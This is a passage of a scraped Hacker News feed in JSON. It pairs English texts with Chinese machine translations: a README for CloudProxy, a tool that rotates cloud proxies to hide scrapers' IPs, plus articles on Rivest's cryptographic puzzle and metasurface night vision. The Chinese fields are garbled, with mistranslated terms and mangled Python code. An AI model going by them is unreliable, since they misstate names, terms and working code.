"CloudProxy\u7684\u76ee\u7684\u662f\u9690\u85cf\u4e91\u5c42\u540e\u9762\u7684\u522e\u5200IP\u3002\u5b83\u5141\u8bb8\u60a8\u4f7f\u7528\u6d41\u884c\u7684\u4e91\u63d0\u4f9b\u5546\u65cb\u8f6c\u4e00\u4e2a\u4ee3\u7406\u6c60\uff0c\u53ea\u9700\u4e00\u4e2aAPI\u4ee4\u724c\u3002\u65e0\u9700\u914d\u7f6e\u3002\n        CloudProxy\u8fc7\u5ea6\u514b\u62c9\u5e15\u6bd2\u7684\u4e3b\u8981\u4f18\u70b9\u662fCloudProxy\u53ea\u9700\u8981\u6765\u81ea\u4e91\u63d0\u4f9b\u5546\u7684API\u4ee4\u724c\u3002 CloudProxy\u81ea\u52a8\u90e8\u7f72\u5e76\u5728\u4e91\u5b9e\u4f8b\u4e0a\u914d\u7f6e\u4ee3\u7406\uff0c\u800c\u65e0\u9700\u7528\u6237\u9700\u8981\u9884\u914d\u7f6e\u6216\u590d\u5236\u56fe\u50cf\u3002\n            age_limit  - \u4ee5\u79d2\u4e3a\u5355\u4f4d\u8bbe\u7f6e\u524d\u5411\u4ee3\u7406\u7684\u5e74\u9f84\u9650\u5236\u3002\u8fbe\u5230\u5e74\u9f84\u9650\u5236\u540e\uff0c\u4ee3\u7406\u88ab\u66ff\u6362\u3002\u503c0\u7981\u7528\u8be5\u529f\u80fd\u3002\u9ed8\u8ba4\u503c\uff1a0\u3002\n    docker\u8fd0\u884c-e username =\uff06\uff0339; change_this_username\uff06\uff0339; \\ -e password =\uff06\uff0339; change_this_password\uff06\uff0339; \\ -e digitalocean_enabled = true \\ -e digitalocean_access_token =\uff06\uff0339;\u60a8\u7684\u79d8\u5bc6\u8bbf\u95ee\u952e\uff06\uff0339; \\ -IT -P 8000\uff1a8000\u8089\u7c7b/ CloudProxy\uff1a\u6700\u65b0\n \u5efa\u8bae\u4f7f\u7528\u7801\u5934\u56fe\u50cf\u6807\u8bb0\u4e3av\u7248\u672c\u3002 Laffin / CloudProxy\uff1a0.3.0-Beta\uff0c\u8bf7\u53c2\u9605\u6700\u65b0\u7248\u672c\u3002\n  CloudProxy\u5728localhost\u4e0a\u516c\u5f00API\uff1a8000\u3002\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0bAPI\u68c0\u7d22\u5e26\u6709\u90e8\u7f72\u4ee3\u7406\u670d\u52a1\u5668\u7684Auth\u7684IP\u3002\u7136\u540e\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9bIP\u6765\u4ee3\u7406\u3002\n \u4f8b\u5982\uff0c\u5faa\u73af\u901a\u8fc7IPS\u8fdb\u884c\u66ff\u4ee3\u7684\u903b\u8f91\u5c06\u9700\u8981\u5728\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u4f8b\u5982\uff1a \n\u5c06\u968f\u673a\u5bfc\u5165\u8bf7\u6c42\u4f5c\u4e3aRequests\uff03\u4eceCloudProxy Def Randum_Proxy\uff08\uff09\u8fd4\u56de\u4e00\u4e2a\u968f\u673a\u4ee3\u7406\u7a0b\u5e8f\uff1aIPS =\u8bf7\u6c42\u3002\u5f97\u5230\uff08\uff06\uff0334; http\uff1a// localhost\uff1a8000\uff06\uff0334;\uff09\u3002 json\uff08\uff09\u968f\u673a\u8fd4\u56de\u3002\u9009\u62e9\uff08IPS [\uff06\uff0339; IPS\uff06\uff0339;]\uff09\u4ee3\u7406= {\uff06\uff0334; http\uff06\uff0334 ;: randum_proxy\uff08\uff09\uff0c\uff06\uff0334; https\uff06\uff0334 ;: random_proxy\uff08\uff09} my_request =\u8bf7\u6c42\u3002\u83b7\u5f97\uff08\uff06\uff0334; https\uff1a//api.ipify.org&#34;\uff0c\u4ee3\u7406=\u4ee3\u7406\uff09\n   \u60a8\u53ef\u4ee5\u901a\u8fc7API\u548cUI\u7ba1\u7406CloudProxy\u3002\u60a8\u53ef\u4ee5\u8bbf\u95eehttp\uff1a// localhost / ui\u7684UI\u3002\n \u60a8\u53ef\u4ee5\u901a\u8fc7UI\u5411\u4e0a\u548c\u5411\u4e0b\u7f29\u653e\u4ee3\u7406\u5e76\u5c06\u5176\u5220\u9664\u6bcf\u4e2a\u63d0\u4f9b\u5546\u3002\n                                CloudProxy\u5728\u6bcf30\u79d2\u7684\u65f6\u95f4\u8868\u4e2d\u8fd0\u884c\uff0c\u5b83\u5c06\u68c0\u67e5\u6700\u5c0f\u7f29\u653e\u662f\u5426\u5df2\u6ee1\u8db3\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5219\u5b83\u5c06\u90e8\u7f72\u6240\u9700\u6570\u91cf\u7684\u4ee3\u7406\u3002\u65b0\u7684\u4ee3\u7406\u4fe1\u606f\u5c06\u5728\u90e8\u7f72\u5e76\u51c6\u5907\u4f7f\u7528\u540e\u663e\u793a\u5728IP\u4e2d\u3002\n  \u8be5\u9879\u76ee\u5904\u4e8e\u65e9\u671f\u7684Alpha\uff0c\u5177\u6709\u6709\u9650\u7684\u529f\u80fd\u3002\u5c06\u6765\uff0c\u5c06\u652f\u6301\u66f4\u591a\u63d0\u4f9b\u5546\uff0c\u5c06\u5b9e\u65bd\u81ea\u52a8\u9636\u6bb5\uff0c\u5e76\u81f4\u5bcc\u4e3a\u5bcc\u6709\u7684API\uff0c\u4ee5\u5141\u8bb8\u5bf9\u4ee3\u7406\u5546\u7684\u9ed1\u540d\u5355\u548c\u56de\u6536\u3002\n   \u8d21\u732e\u662f\u4f7f\u5f00\u6e90\u793e\u533a\u6210\u4e3a\u4e00\u4e2a\u4ee4\u4eba\u60ca\u53f9\uff0c\u6fc0\u52b1\u548c\u521b\u9020\u7684\u4ee4\u4eba\u60ca\u53f9\u3002\u60a8\u6240\u505a\u7684\u4efb\u4f55\u8d21\u732e\u90fd\u975e\u5e38\u611f\u8c22\u3002 ", "note_en": "The purpose of CloudProxy is to hide your scrapers IP behind the cloud. It allows you to spin up a pool of proxies using popular cloud providers with just an API token. No configuration needed.\n        The primary advantage of CloudProxy over Scrapoxy is that CloudProxy only requires an API token from a cloud provider. CloudProxy automatically deploys and configures the proxy on the cloud instances without the user needing to preconfigure or copy an image.\n            AGE_LIMIT - set the age limit for your forward proxies in seconds. Once the age limit is reached, the proxy is replaced. A value of 0 disables the feature. Default value: 0.\n    docker run -e USERNAME=  &#39;CHANGE_THIS_USERNAME &#39; \\ -e PASSWORD=  &#39;CHANGE_THIS_PASSWORD &#39; \\ -e DIGITALOCEAN_ENABLED=True \\ -e DIGITALOCEAN_ACCESS_TOKEN=  &#39;YOUR SECRET ACCESS KEY &#39; \\ -it -p 8000:8000 laffin/cloudproxy:latest\n It is recommended to use a Docker image tagged to a version e.g.  laffin/cloudproxy:0.3.0-beta, see  releases for latest version.\n  CloudProxy exposes an API on localhost:8000. Your application can use the below API to retrieve the IPs with auth for the proxy servers deployed. Then your application can use those IPs to proxy.\n The logic to cycle through IPs for proxying will need to be in your application, for example:\n import  random import  requests  as  requests # Returns a random proxy from CloudProxy def  random_proxy():  ips  =  requests. get( &#34;http://localhost:8000&#34;). json()  return  random. choice( ips[ &#39;ips&#39;]) proxies  = { &#34;http&#34;:  random_proxy(),  &#34;https&#34;:  random_proxy()} my_request  =  requests. get( &#34;https://api.ipify.org&#34;,  proxies = proxies)\n   You can manage CloudProxy via an API and UI. You can access the UI at  http://localhost/ui.\n You can scale up and down your proxies and remove them for each provider via the UI.\n                                CloudProxy runs on a schedule of every 30 seconds, it will check if the minimum scaling has been met, if not then it will deploy the required number of proxies. The new proxy info will appear in IPs once they are deployed and ready to be used.\n  The project is at early alpha with limited features. In the future more providers will be supported, autoscaling will be implemented and a rich API to allow for blacklisting and recycling of proxies.\n   Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are  greatly appreciated.", "posttime": "2021-06-26 17:32:42", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u9690\u85cf,hide,\u4ee3\u7406", "title": "CloudProxy  - \u9690\u85cf\u4e91\u80cc\u540e\u7684\u522e\u5200IP ", "title_en": "Cloudproxy \u2013 hide your scrapers IP behind the cloud", "transed": 1, "url": "https://github.com/claffin/cloudproxy", "via": "", "real_tags": ["\u9690\u85cf", "hide", "\u4ee3\u7406"]}, {"category": "", "categoryclass": "", "imagename": "b87673dd3d9f33462ab823fcad449b7c.jpg", "infoid": 1068407, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "1999\u5e74\uff0c\u5f53\u957f\u671f\u9ebb\u7701\u7406\u5de5\u5b66\u9662\u7f57\u6069\u91cc\u7ef4\u65af\u7279\u6559\u6388\u521b\u9020\u4e86\u4e00\u4e2a\u52a0\u5bc6\u62fc\u56fe\uff0c\u4ee5\u5e86\u795d\u5b66\u6821\u7684\u8ba1\u7b97\u673a\u79d1\u5b66\u5b9e\u9a8c\u5ba435\u5468\u5e74\uff0c\u4ed6\u8868\u793a\u5c06\u5728\u4efb\u4f55\u4eba\u53ef\u80fd\u89e3\u51b3\u4e4b\u524d\u518d\u8fc735\u5e74\u3002  RIVEST\u8868\u793a\uff0c\u62fc\u56fe\u9700\u898135\u5e74\u7684\u8fde\u7eed\u8ba1\u7b97\uff0c\u4ee5\u53ca\u6bcf\u5e74\u7528\u4e0b\u4e00\u4e2a\u6700\u5feb\u7684\u6a21\u578b\u5207\u6362\u6267\u884c\u5b83\u7684\u8ba1\u7b97\u673a\u3002 \u4ed6\u8bf4\u5b83\u9700\u8981\u51e0\u4e4e\u4e0d\u53ef\u60f3\u8c61\u7684\u6b65\u9aa4\u3002  \u201c\u5927\u591a\u6570\u5de5\u4f5c\u5c06\u5728\u8fc7\u53bb\u51e0\u5e74\u4e2d\u771f\u6b63\u5b8c\u6210\uff0c\u4f46\u662f\uff0c\u201d\u6700\u8fd1\u51e0\u5e74\u6765\u7684\u662f\uff0c\u201c\u5f53\u65f6\u6700\u8fd1\u3002  \u4ed6\u6ca1\u60f3\u5230\u7684\u662f\u5728\u51e0\u5e74\u5185\u5b8c\u6210\u7684\u6240\u6709\u5de5\u4f5c - \u4ee5\u53ca\u5341\u5e74\u548c\u5341\u5e74\u7684\u65f6\u95f4\u8868\u3002 ", "note_en": "In 1999, when longtime MIT professor Ron Rivest created a cryptographic puzzle to celebrate the 35th anniversary of the school\u2019s Laboratory for Computer Science, he said it would be another 35 years before anyone could possibly solve it.\n Rivest said the puzzle would take 35 years of continuous computing, along with switching out the computer performing it with the next fastest model each year. He said it would require a virtually unimaginable number of steps.\n \u201cMost of the work will really be done in the last few years, however,\u201d Rivest\u00a0said at the time.\n What he didn\u2019t expect was for\u00a0 all of the work to be finished in a few years \u2014 and a decade and a half ahead of schedule.", "posttime": "2021-06-26 17:28:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u7a0b\u5e8f,\u89e3\u51b3,solve,\u62fc\u56fe", "title": "\u7a0b\u5e8f\u5458\u89e3\u51b3\u4e86MIT\u768420\u5c81\u52a0\u5bc6\u62fc\u56fe ", "title_en": "Programmers solve MIT\u2019s 20-year-old cryptographic puzzle", "transed": 1, "url": "https://www.boston.com/news/local-news/2019/05/21/bernard-fabrot-mit-puzzle/", "via": "", "real_tags": ["\u7a0b\u5e8f", "\u89e3\u51b3", "solve", "\u62fc\u56fe"]}, {"category": "", "categoryclass": "", "imagename": "c381752bccaec104ff585f4c4e1fb98d.png", "infoid": 1068406, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd9\u5bf9\u4efb\u4f55\u89c2\u770b\u4e86\u8bb8\u591a\u52a8\u4f5c\u7535\u5f71\u6216\u626e\u6f14\u804c\u8d23\u7684\u4eba\u6765\u8bf4\u662f\u4e00\u4e2a\u719f\u6089\u7684\u613f\u666f\uff1a\u4e00\u4e2a\u4f7f\u4e0d\u53ef\u89c1\u7269\u4f53\u53ef\u89c1\u7684\u5e7d\u7075\u822c\u7684\u7eff\u8272\u56fe\u50cf\u3002\u81ea20\u4e16\u7eaa60\u5e74\u4ee3\u4e2d\u671f\u5f00\u53d1\u7b2c\u4e00\u591c\u89c6\u8bbe\u5907\u4ee5\u6765\uff0c\u8be5\u6280\u672f\u5df2\u6355\u83b7\u4e86\u6d41\u884c\u7684\u60f3\u8c61\u529b\u3002\n \u591c\u89c6\u62a4\u76ee\u955c\uff0c\u7ea2\u5916\u6444\u50cf\u673a\u548c\u5176\u4ed6\u7c7b\u4f3c\u7684\u8bbe\u5907\u68c0\u6d4b\u4ece\u7269\u4f53\u53cd\u5c04\u7684\u7ea2\u5916\u5149\u6216\u8005\u4ee5\u70ed\u91cf\u7684\u5f62\u5f0f\u68c0\u6d4b\u4ece\u7269\u4f53\u53d1\u51fa\u7684\u7ea2\u5916\u5149\u3002\u4eca\u5929\uff0c\u8fd9\u4e9b\u8bbe\u5907\u4e0d\u4ec5\u7531\u519b\u961f\u800c\u5e7f\u6cdb\u4f7f\u7528\uff0c\u4e5f\u662f\u7531\u6267\u6cd5\u548c\u7d27\u6025\u670d\u52a1\uff0c\u5b89\u5168\u548c\u76d1\u7763\u884c\u4e1a\uff0c\u91ce\u751f\u52a8\u7269\u730e\u4eba\u548c\u9732\u8425\u7231\u597d\u8005\u7684\u7231\u597d\u8005\u3002\n \u4f46\u76ee\u524d\u7684\u6280\u672f\u5e76\u975e\u6ca1\u6709\u95ee\u9898\u3002\u5546\u7528\u7ea2\u5916\u76f8\u673a\u963b\u6321\u53ef\u89c1\u5149\uff0c\u6270\u4e71\u6b63\u5e38\u89c6\u89c9\u3002\u9f7f\u8f6e\u5e9e\u5927\u548c\u91cd\uff0c\u9700\u8981\u4f4e\u6e29 - \u5e76\u4e14\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5373\u4f7f\u662f\u4f4e\u6e29\u51b7\u5374 - \u5de5\u4f5c\u3002\n  \u6211\u4eec\u63d0\u51fa\u4e86\u4e00\u79cd\u65b0\u6280\u672f\uff0c\u8be5\u6280\u672f\u91c7\u7528\u8d85\u8584\u5c42\u7684\u7eb3\u7c73\u6676\u4f53\u6765\u4f7f\u7ea2\u5916\u5149\u53ef\u89c1\uff0c\u89e3\u51b3\u4e86\u5f53\u524d\u8bbe\u5907\u7684\u8bb8\u591a\u957f\u671f\u5b58\u5728\u7684\u95ee\u9898\u3002\u6211\u4eec\u7684\u7814\u7a76\u53d1\u8868\u4e8e\u5148\u8fdb\u7684\u5149\u5b50\u5b66\u3002\n  \u6211\u4eec\u7684\u6700\u7ec8\u76ee\u6807\u662f\u751f\u4ea7\u4e00\u79cd\u706f\uff0c\u53ef\u4ee5\u5750\u5728\u773c\u955c\u6216\u5176\u4ed6\u955c\u7247\u4e0a\uff0c\u7531\u5fae\u5c0f\u7684\u5185\u7f6e\u6fc0\u5149\u5668\u63d0\u4f9b\u52a8\u529b\uff0c\u8ba9\u4eba\u4eec\u5728\u9ed1\u6697\u4e2d\u770b\u5230\u3002\n  \u5546\u7528\u7ea2\u5916\u6444\u50cf\u673a\u5c06\u7ea2\u5916\u5149\u8f6c\u6362\u4e3a\u7535\u4fe1\u53f7\uff0c\u7136\u540e\u5728\u663e\u793a\u5c4f\u4e0a\u663e\u793a\u3002\u7531\u4e8e\u7ea2\u5916\u5149\u7684\u80fd\u91cf\u548c\u9891\u7387\u4f4e\uff0c\u5b83\u4eec\u9700\u8981\u4f4e\u6e29\u3002\u8fd9\u4f7f\u5f97\u4f20\u7edf\u7684\u7ea2\u5916\u63a2\u6d4b\u5668\u5e9e\u5927\u548c\u91cd\u6c89\u91cd - \u4e00\u4e9b\u5b89\u5168\u4eba\u5458\u7531\u4e8e\u7ecf\u5e38\u4f7f\u7528\u591c\u89c6\u62a4\u76ee\u955c\u800c\u5bfc\u81f4\u6162\u6027\u9888\u90e8\u635f\u4f24\u3002\n \u76ee\u524d\u6280\u672f\u7684\u53e6\u4e00\u4e2a\u7f3a\u70b9\u662f\u5b83\u963b\u65ad\u4e86\u53ef\u89c1\u5149\u7684\u4f20\u8f93\uff0c\u4ece\u800c\u6270\u4e71\u6b63\u5e38\u89c6\u89c9\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u7ea2\u5916\u56fe\u50cf\u53d1\u9001\u5230\u663e\u793a\u76d1\u89c6\u5668\uff0c\u7559\u4e0b\u6b63\u5e38\u7684\u89c6\u89c9\u3002\u4f46\u662f\uff0c\u5f53\u7528\u6237\u6b63\u5728\u79fb\u52a8\u65f6\uff0c\u6b64\u89e3\u51b3\u65b9\u6848\u662f\u4e0d\u53ef\u884c\u7684\u3002 \n\u8fd8\u6709\u4e00\u4e9b\u5168\u5149\u5b66\u66ff\u4ee3\u54c1\uff0c\u4e0d\u6d89\u53ca\u7535\u4fe1\u53f7\u3002\u76f8\u53cd\uff0c\u5b83\u4eec\u76f4\u63a5\u5c06\u7ea2\u5916\u5149\u8f6c\u6362\u6210\u53ef\u89c1\u5149\u3002\u7136\u540e\u53ef\u4ee5\u901a\u8fc7\u773c\u775b\u6216\u76f8\u673a\u6355\u83b7\u53ef\u89c1\u5149\u3002\n \u8fd9\u4e9b\u6280\u672f\u901a\u8fc7\u5c06\u8fdb\u5165\u7684\u7ea2\u5916\u5149\u4e0e\u5f3a\u5149\u6e90\u7ec4\u5408 - \u4e00\u79cd\u6fc0\u5149\u675f - \u5728\u79f0\u4e3a\u201c\u975e\u7ebf\u6027\u6676\u4f53\u201d\u7684\u6750\u6599\u5185\u3002\u7136\u540e\u6676\u4f53\u5728\u53ef\u89c1\u5149\u8c31\u4e2d\u53d1\u5149\u3002\n \u7136\u800c\uff0c\u975e\u7ebf\u6027\u6676\u4f53\u5e9e\u5927\u4e14\u6602\u8d35\uff0c\u5e76\u4e14\u53ea\u80fd\u68c0\u6d4b\u5728\u7ea2\u5916\u9891\u7387\u7a84\u5e26\u4e2d\u7684\u5149\u3002\n  \u6211\u4eec\u7684\u5de5\u4f5c\u63a8\u8fdb\u4e86\u8fd9\u79cd\u5168\u5149\u5b66\u65b9\u6cd5\u3002\u6211\u4eec\u5f00\u59cb\u4f7f\u7528\u88ab\u79f0\u4e3a\u201cMetasurfaces\u201d\u7684\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u7eb3\u7c73\u6676\u4f53\u5c42\uff0c\u800c\u4e0d\u662f\u975e\u7ebf\u6027\u6676\u4f53\u3002 Metasurfaces\u662f\u8d85\u8584\u548c\u8d85\u5149\u7ebf\uff0c\u53ef\u4ee5\u8c03\u6574\u4ee5\u64cd\u7eb5\u7a7f\u8fc7\u5b83\u4eec\u7684\u5149\u7684\u989c\u8272\u6216\u9891\u7387\u3002\n \u8fd9\u4f7f\u5f97Metasurfaces\u6210\u4e3a\u5c06\u7ea2\u5916\u5149\u5b50\u8f6c\u6362\u4e3a\u53ef\u89c1\u7684\u6709\u5438\u5f15\u529b\u7684\u5e73\u53f0\u3002\u91cd\u8981\u7684\u662f\uff0c\u900f\u660e\u5143\u4ef6\u53ef\u4ee5\u4f7f\u7ea2\u5916\u6210\u50cf\u80fd\u591f\u540c\u65f6\u8fdb\u884c\u6b63\u5e38\u89c6\u89c9\u3002\n \u6211\u4eec\u7684\u5c0f\u7ec4\u65e8\u5728\u5c55\u793a\u4e0eMetasurfaces\u7684\u7ea2\u5916\u6210\u50cf\u3002\u6211\u4eec\u8bbe\u8ba1\u4e86\u7531\u6570\u767e\u4e2a\u4ee4\u4eba\u96be\u4ee5\u7f6e\u4fe1\u7684\u5fae\u5c0f\u6676\u4f53\u5929\u7ebf\u7ec4\u6210\u7684\u5143\u8868\u9762\uff0c\u7531\u7837\u5316\u9553\u5236\u6210\u3002\n \u8fd9\u79cd\u5143\u8868\u9762\u8bbe\u8ba1\u7528\u4e8e\u901a\u8fc7\u67d0\u4e9b\u7ea2\u5916\u9891\u7387\u7684\u5171\u632f\u653e\u5927\u5149\uff0c\u4ee5\u53ca\u6fc0\u5149\u5668\u7684\u9891\u7387\u548c\u53ef\u89c1\u5149\u8f93\u51fa\u3002\u7136\u540e\u6211\u4eec\u5236\u9020\u4e86\u91d1\u5c5e\u8868\u9762\u5e76\u5c06\u5176\u8f6c\u79fb\u5230\u900f\u660e\u73bb\u7483\u4e0a\uff0c\u5728\u73bb\u7483\u8868\u9762\u4e0a\u5f62\u6210\u4e00\u5c42\u7eb3\u7c73\u6676\u4f53\u3002 \n\u4e3a\u4e86\u6d4b\u8bd5\u6211\u4eec\u7684\u5143\u66f2\u9762\uff0c\u6211\u4eec\u7528\u76ee\u6807\u7684\u7ea2\u5916\u56fe\u50cf\u7167\u4eae\u5b83\uff0c\u5e76\u770b\u5230\u7ea2\u5916\u56fe\u50cf\u88ab\u8f6c\u6362\u4e3a\u200b\u200b\u53ef\u89c1\u7684\u7eff\u8272\u56fe\u50cf\u3002\u6211\u4eec\u7528\u76ee\u6807\u7684\u5404\u79cd\u4f4d\u7f6e\u6d4b\u8bd5\u4e86\u8fd9\u4e00\u70b9\uff0c\u4e5f\u6ca1\u6709\u76ee\u6807 - \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u770b\u5230Metasurface\u672c\u8eab\u7684\u7eff\u8272\u6392\u653e\u3002\u5728\u83b7\u5f97\u7684\u56fe\u50cf\u4e2d\uff0c\u6697\u6761\u7eb9\u5bf9\u5e94\u4e8e\u7ea2\u5916\u76ee\u6807\uff0c\u88ab\u7eff\u8272\u53ef\u89c1\u53d1\u5c04\u5305\u56f4\u3002\n \u5c3d\u7ba1\u901a\u8fc7\u7ec4\u5408\u5143\u8868\u9762\u7684\u72ec\u7acb\u7eb3\u7c73\u6676\u4f53\u4e0a\u5347\u7684\u7ea2\u5916\u56fe\u50cf\u7684\u4e0d\u540c\u90e8\u5206\uff0c\u4f46\u662f\u5728\u53ef\u89c1\u5149\u4e2d\u518d\u73b0\u56fe\u50cf\u3002\n  \u867d\u7136\u6211\u4eec\u7684\u5b9e\u9a8c\u53ea\u662f\u4e00\u4e2a\u6982\u5ff5\u8bc1\u660e\uff0c\u4f46\u8be5\u6280\u672f\u539f\u5219\u4e0a\u53ef\u4ee5\u505a\u5f88\u591a\u4e0d\u53ef\u80fd\u4e0e\u4f20\u7edf\u7cfb\u7edf\u4e0d\u53ef\u80fd\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\u66f4\u5e7f\u6cdb\u7684\u89c6\u89d2\u548c\u591a\u8272\u7ea2\u5916\u6210\u50cf\u3002\n  \u7531\u4e8e\u591c\u89c6\u4e4b\u5916\u7684\u5404\u79cd\u5e94\u7528\uff0c\u5bf9\u4eba\u773c\u4e0d\u53ef\u89c1\u7684\u7ea2\u5916\u5149\u7684\u9700\u6c42\u4e0d\u65ad\u589e\u957f\u3002\u8be5\u6280\u672f\u53ef\u7528\u4e8e\u519c\u4e1a\u4ea7\u4e1a\uff0c\u4ee5\u5e2e\u52a9\u76d1\u63a7\u548c\u7ef4\u6301\u98df\u54c1\u8d28\u91cf\u63a7\u5236\uff0c\u4ee5\u53caLIDAR\u7684\u9065\u611f\u6280\u672f - \u4e00\u79cd\u6709\u52a9\u4e8e\u6620\u5c04\u81ea\u7136\u548c\u4eba\u9020\u73af\u5883\u7684\u6280\u672f\u3002\n \u5728\u66f4\u5e7f\u6cdb\u7684\u80cc\u666f\u4e0b\uff0c\u4f7f\u7528Metasurfaces\u6765\u68c0\u6d4b\uff0c\u4ea7\u751f\u548c\u64cd\u7eb5\u5149\u7ebf\u84ec\u52c3\u53d1\u5c55\u3002\u5229\u7528Metasurfaces\u7684\u529b\u91cf\u5c06\u4f7f\u6211\u4eec\u66f4\u63a5\u8fd1\u5b9e\u65f6\u5168\u606f\u663e\u793a\u5668\uff0c\u81ea\u4e3b\u7cfb\u7edf\u7684\u4eba\u5de5\u89c6\u89c9\uff0c\u4ee5\u53ca\u8d85\u5feb\u901f\u7684\u57fa\u4e8eWiFi\u7684\u6280\u672f\u3002 ", "note_en": "It\u2019s a familiar vision to anyone who has watched a lot of action movies or played Call of Duty: a ghostly green image that makes invisible objects visible. Since the development of the first night-vision devices in the mid-1960s, the technology has captured the popular imagination.\n Night vision goggles, infrared cameras and other similar devices detect infrared light reflected from objects or rather detect infrared light emitted from objects in the form of heat. Today these devices are widely used not only by the military, but also by law enforcement and emergency services, the security and surveillance industries, wildlife hunters, and camping enthusiasts.\n But current technology is not without its problems. Commercial infrared cameras block visible light, disrupting normal vision. The gear is bulky and heavy, and requires low temperatures \u2014 and, in some cases, even cryogenic cooling \u2014 to work.\n  We have proposed a new technology that uses ultra-thin layers of nanocrystals to make infrared light visible, addressing many of the longstanding problems with current devices. Our research is published in  Advanced Photonics.\n  Our eventual goal is to produce a light, film-like layer that can sit on glasses or other lenses, powered by a tiny built-in laser, allowing people to see in the dark.\n  Commercial infrared cameras convert infrared light to an electric signal, which is then shown on a display screen. They require low temperatures, because of the low energy and frequency of infrared light. This makes conventional infrared detectors bulky and heavy \u2013 some security personnel have reported chronic neck injury due to  regular use of night vision goggles .\n Another drawback of the current technology is that it blocks the transmission of visible light, thereby disrupting normal vision. In some cases, infrared images could be sent to a display monitor, leaving normal vision intact. However, this solution is not feasible when users are on the move.\n     There are also some all-optical  alternatives, which do not involve electrical signals. Instead, they directly convert infrared light into visible light. The visible light can then be captured by the eye or a camera.\n These technologies work by combining incoming infrared light with a strong light source \u2013 a laser beam \u2013 inside a material known as \u201cnonlinear crystal\u201d. The crystal then emits light in the visible spectrum.\n However, nonlinear crystals are bulky and expensive, and can only detect light in a narrow band of infrared frequencies.\n  Our work advances this all-optical approach. Instead of a non-linear crystal, we set out to use carefully designed layers of nanocrystal called \u201cmetasurfaces\u201d. Metasurfaces are ultra-thin and ultra-light, and can be tweaked to manipulate the color or frequency of the light that passes through them.\n This makes metasurfaces an attractive platform to convert infrared photons to the visible. Importantly, transparent metasurfaces could enable infrared imaging and allow for normal vision at the same time.\n Our group set out to demonstrate infrared imaging with metasurfaces. We designed a metasurface composed of hundreds of incredibly tiny crystal antennas made of the semiconductor gallium arsenide.\n This metasurface was designed to amplify light by resonance at certain infrared frequencies, as well as the frequency of the laser and the visible light output. We then fabricated the metasurface and transferred it to a transparent glass, forming a layer of nanocrystals on a glass surface.\n  To test our metasurface, we illuminated it with infrared images of a target and saw that the infrared images were converted to visible green images. We tested this with various positions of the target, and also with no target at all \u2014 so we could see the green emission of the metasurface itself. In the images obtained, the dark stripes correspond to the infrared target, surrounded by the green visible emission.\n Despite different parts of the infrared images being up-converted by independent nanocrystals composing the metasurface, the images were well reproduced in visible light.\n  While our experiment is only a proof of concept, this technology can in principle do many things that are not possible with conventional systems, such as a broader angle of view and multi-colour infrared imaging.\n  The demand for detecting infrared light, invisible to human eyes, is constantly growing, due to a wide variety of applications beyond night vision. The technology could be used in the agricultural industry to help monitor and maintain food quality control, and in remote sensing techniques such as LIDAR \u2013 a technology that is helping to map natural and manmade environments.\n In a wider context, the use of metasurfaces to detect, generate and manipulate light is booming. Harnessing the power of metasurfaces will bring us closer to technologies such as real-time holographic displays, artificial vision for autonomous systems, and ultra-fast light-based wifi.", "posttime": "2021-06-26 16:41:53", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8584\u819c,crystal,\u7ea2\u5916", "title": "\u5fae\u578b\u6676\u4f53\u8584\u819c\u53ef\u4ee5\u8ba9\u591c\u89c6\u6210\u4e3a\u65e5\u5e38\u7684\u73b0\u5b9e ", "title_en": "Tiny crystal films could make night vision an everyday reality", "transed": 1, "url": "https://theconversation.com/seeing-the-invisible-tiny-crystal-films-could-make-night-vision-an-everyday-reality-162615", "via": "", "real_tags": ["\u8584\u819c", "crystal", "\u7ea2\u5916"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1068405, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Warning: Can only detect less than 5000 characters\n\u53d1\u8868\u4e8e3\u670822\u65e5\uff0c2021 20:52 UTC\uff08Mon\uff09\u7531Cyber\u200b\u200bax\uff08\u272d\u652f\u6301\u8005\u272d\uff0c\uff0352523\uff09[\u94fe\u63a5]\n  \u591a\u5e74\u6765\u6211\u53d1\u73b0\u5976\u725b\u5f88\u7cdf\u7cd5\uff0c\u6700\u597d\u907f\u514d\u5b83\u4eec\u3002\n \u5982\u679c\u4f60\uff06\uff0339;\u91cd\u65b0\u6253\u7834API\u517c\u5bb9\u6027\uff0c*\u7136\u540e\u4f60\u53ef\u80fd\u53ea\u662f\u544a\u8bc9\u4eba\u4eec\u4f7f\u7528vfork\uff08\uff09\u6216posix_spawn\uff08\uff09\uff0c\u56e0\u4e3a\u90a3\u4e9b\u5df2\u7ecf\u6210\u719f\u5e76\u4e14\u5f88\u597d\u5730\u7406\u89e3\u7684\u63a5\u53e3\uff0c\u5e76\u4e14\u540e\u8005\u751a\u81f3\u662f\u4fbf\u643a\u5f0f\u7684\u3002\u987a\u4fbf\u63d0\u4e00\u4e0b\uff0c\u5728\u7814\u7a76\u8fd9\u4e00\u8bc4\u8bba\u65f6\uff0c\u6211\u5076\u7136\u53d1\u73b0\u4e86\u6765\u81ea\u514b\u9686\uff082\uff09\uff1a\uff06gt\u7684TIDBIT;\u4e0eGlibc\u5305\u88c5\u5668\u76f8\u6bd4\uff0c\u539f\u59cb\u514b\u9686\uff08\uff09\u7cfb\u7edf\u8c03\u7528\uff06gt;\u63a5\u53d7\u7a7a\u503c\u4f5c\u4e3a\u5806\u6808\u53c2\u6570\uff08\u514b\u9